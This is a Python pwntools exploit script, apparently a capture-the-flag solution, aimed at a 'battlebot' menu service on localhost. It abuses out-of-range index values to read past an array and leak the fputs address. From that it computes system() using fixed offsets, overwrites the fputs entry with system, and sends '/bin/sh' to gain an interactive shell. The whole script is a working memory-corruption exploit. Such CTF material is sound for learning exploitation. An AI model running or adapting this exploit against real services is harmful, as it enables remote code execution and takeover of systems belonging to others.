from pwn import *

#context.log_level = 'debug'

def view(bid):
    r.sendlineafter(b'--> ', b'1')
    r.sendlineafter(b' > ', str(bid).encode())

    r.recvuntil(b': ')
    hp = int(r.recvuntil(b'\n'))
    r.recvuntil(b': ')
    shd = int(r.recvuntil(b'\n'))
    r.recvuntil(b': ')
    atk = int(r.recvuntil(b'\n'))

    return hp, shd, atk

def edit(bid, hp, shd, atk):
    r.sendlineafter(b'--> ', b'2')
    r.sendlineafter(b' > ', str(bid).encode())

    r.sendlineafter(b' > ', str(hp).encode())
    r.sendlineafter(b' > ', str(shd).encode())
    r.sendlineafter(b' > ', str(atk).encode())

def leave_feedback(feedback):
    r.sendlineafter(b'--> ', b'4')
    r.sendlineafter(b' > ', b'n')
    r.sendlineafter(b' > ', feedback.encode())


print('[*] connecting')
r = remote('localhost', 55555)

print('[*] viewing battlebot -9')
hp9, shd9, atk9 = view(2**32 * 2 - 9)
print(f'[+] {hp9} {shd9} {atk9}')

print('[*] viewing battlebot -10')
hp10, shd10, atk10 = view(2**32 * 2 - 10)
print(f'[+] {hp10} {shd10} {atk10}')

fputs = hp9.to_bytes(4, byteorder='little', signed=True)[:2][::-1]
fputs += atk10.to_bytes(4, byteorder='little', signed=True)[::-1]
fputs = int.from_bytes(fputs)
print(f'[+] fputs: {hex(fputs)}')

system = fputs - 0x004609b1 + 0x0045bb7e
print(f'[+] system: {hex(system)}')

print(f'[*] overwriting fputs to system')
system = p64(system)
hp9 = int.from_bytes(system[4:], byteorder='little')
atk10 = int.from_bytes(system[:4], byteorder='little')

print(f'[*] editing battlebot -9 to {hp9} {shd9} {atk9}')
edit(2**32 * 2 - 9, hp9, shd9, atk9)

print(f'[*] editing battlebot -10 to {hp10} {shd10} {atk10}')
edit(2**32 * 2 - 10, hp10, shd10, atk10)

pause()

print(f'[*] legalize nuclear bombs')
leave_feedback('/bin/sh')

r.interactive()
